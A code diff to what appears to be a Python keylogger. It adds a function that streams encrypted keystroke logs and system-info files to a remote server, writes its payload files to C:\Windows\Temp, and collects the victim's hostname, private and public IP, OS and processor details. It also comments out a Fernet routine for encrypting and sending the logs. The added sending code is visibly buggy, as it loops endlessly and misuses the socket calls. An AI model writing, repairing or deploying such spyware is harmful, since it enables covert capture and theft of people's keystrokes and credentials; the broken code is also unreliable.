@@ -26,13 +26,26 @@ systemInfo = "systemInfo.txt"
 loggedKeysEncrypted = "loggedKeysEncrypted.txt"
 systemInfoEncrypted = "systemInfoEncrypted.txt"
 
-path = "" #"C:\Users\default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" will go here eventually?
+## Networking Variables
+udpPort = 25005
+buffer_size = 1024
+server_ip = "127.0.0.1" #local testing
+
+# payload destination variables
+path = "C:\Windows\Temp"
 extend = "\\"
 extendedPath = path + extend
 
 
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-# def sendFile():
+### sends encrypted files ###
+def sendFile(filename):
+    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    f = open (filename, 'rb')
+    l = f.read(buffer_size)
+    while(l):
+        clientsocket.sendto(l.encode(), (server_ip, udpPort))
+    f.close()
+    clientsocket.close()
 
 
 ### This creates a document that contains useful system information and specifications ###
@@ -41,8 +54,13 @@ def getSystemInfo():
     with open(extendedPath + systemInfo, "a") as f:
         hostname = socket.gethostname()
         # Writes hostname
-        f.write("Hostname: " + hostname + '\n')
-
+        try:
+            f.write("Hostname: " + hostname + '\n')
+        
+        except Exception:
+           f.write("ERROR: could not retrieve Hostname" + '\n') 
+        
+        # Writes Public IP address
         privateIP = socket.gethostbyname(hostname)
         try:
             publicIP = get("https://api.ipify.org").text
@@ -52,16 +70,41 @@ def getSystemInfo():
             f.write("ERROR: could not retrieve public IP address" + '\n')
 
         # Writes Private IP
-        f.write("private IP address: " + privateIP + '\n')
-        # Writes Machine Name
-        f.write("Machine: " + platform.machine() + '\n')
-        # Writes System Type
-        f.write("System: "+ platform.system() + '\n')
-        # Writes System Version
-        f.write("Version: "+ platform.version() +'\n')
-        # Writes Processor
-        f.write("Processor: " + platform.processor() + '\n')
+        try:
+            f.write("private IP address: " + privateIP + '\n')
 
+        except Exception:
+            f.write("ERROR: could not retrieve private IP address" + '\n')
+
+        # Writes Machine Name
+        try:
+            f.write("Machine: " + platform.machine() + '\n')
+
+        except Exception:
+            f.write("ERROR: could not retrieve machine name" + '\n')
+
+        # Writes System Type
+        try:
+            f.write("System: "+ platform.system() + '\n')
+
+        except Exception:
+            f.write("ERROR: could not retrieve system type" + '\n')
+
+        # Writes System Version
+        try:
+            f.write("Version: "+ platform.version() +'\n')
+        
+        except Exception:
+            f.write("ERROR: could not retrieve platform version" + '\n')
+
+        # Writes Processor
+        try:
+            f.write("Processor: " + platform.processor() + '\n')
+        
+        except Exception:
+            f.write("ERROR: could not retrieve processor info" + '\n')
+
+# gets system info and writes to file
 getSystemInfo()
 
 ### Run Length Variables ###
@@ -171,29 +214,29 @@ def des3_encrypt(original_file, encrypt_file):
     f.close()
     return encryptor.encrypt(data), iv
 
-# Fernet Encryption
-def fernetEncrypt():
-    filesToEncrypt = [extendedPath + systemInfo, extendedPath + loggedKeys]
-    encryptedFileNames = [extendedPath + systemInfoEncrypted, extendedPath + loggedKeysEncrypted]
+# Fernet Encryption - May be implemented later
+# def fernetEncrypt():
+#     filesToEncrypt = [extendedPath + systemInfo, extendedPath + loggedKeys]
+#     encryptedFileNames = [extendedPath + systemInfoEncrypted, extendedPath + loggedKeysEncrypted]
 
-    count = 0
+#     count = 0
 
-    for encryptingFile in filesToEncrypt:
+#     for encryptingFile in filesToEncrypt:
 
-        with open(filesToEncrypt[count], 'rb') as f:
-            data = f.read()
+#         with open(filesToEncrypt[count], 'rb') as f:
+#             data = f.read()
 
-        fernet = Fernet(key)
-        encrypted = fernet.encrypt(data)
+#         fernet = Fernet(key)
+#         encrypted = fernet.encrypt(data)
 
-        with open(encryptedFileNames[count], 'wb') as f:
-            f.write(encrypted)
+#         with open(encryptedFileNames[count], 'wb') as f:
+#             f.write(encrypted)
 
-        ### SEND ENCRYPTED FILES TO SERVER HERE ###
-        #sendFile()
-        count += 1
+#         ### SEND ENCRYPTED FILES TO SERVER HERE ###
+#         #sendFile()
+#         count += 1
 
-    time.sleep(120)
+#     time.sleep(120)
 
 
 ### Deletes Files After they are Encrypted and Sent ###
